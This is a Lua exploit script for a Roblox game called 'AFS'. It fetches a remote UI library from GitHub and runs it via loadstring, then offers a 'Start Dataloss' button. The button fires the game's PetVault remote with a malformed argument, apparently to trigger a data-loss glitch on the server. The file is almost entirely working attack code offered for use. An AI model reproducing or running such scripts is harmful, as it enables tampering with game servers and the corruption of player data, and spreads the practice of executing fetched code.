function Return_Lowest_Unit(Unit_Table)
    local Lowest_Level, Lowest_Unit = math.huge
    
    for _, Unit in ipairs(Unit_Table) do
            if Unit["Level"] < Lowest_Level then
                Lowest_Level = Unit["Level"]
                Lowest_Unit = Unit
            end
    end
    
    return Lowest_Unit
end

local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()

local X = Material.Load({
	Title = "AFS - tobias020108back.",
	Style = 3,
	SizeX = 500,
	SizeY = 350,
	Theme = "Dark",
	ColorOverrides = {
		MainFrame = Color3.fromRGB(35,35,35)
	}
})

local Y = X.New({
	Title = "Main"
})

local A = Y.Button({
	Text = "Selected no Type",
	Callback = function()
	if Type == "Start Dataloss" then
        local args = {
            [1] = Return_Lowest_Unit(require(game.ReplicatedStorage.ModuleScripts.LocalDairebStore).GetStoreProxy("GameData"):GetData("Pets")).UID,
            [2] = true,
            [3] = "\191"
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("PetVault"):FireServer(unpack(args))

        TextField:SetText("Started")
		end
	end
})

local D = Y.Dropdown({
	Text = "Type",
	Callback = function(Value)
		getgenv().Type = Value
	end,
	Options = {
		"Start Dataloss"
	}
})

getgenv().TextField = Y.TextField({
  Text = "Status",
  Type = "Default"
})

while task.wait() do
if Type then
A:SetText(Type)
end
end
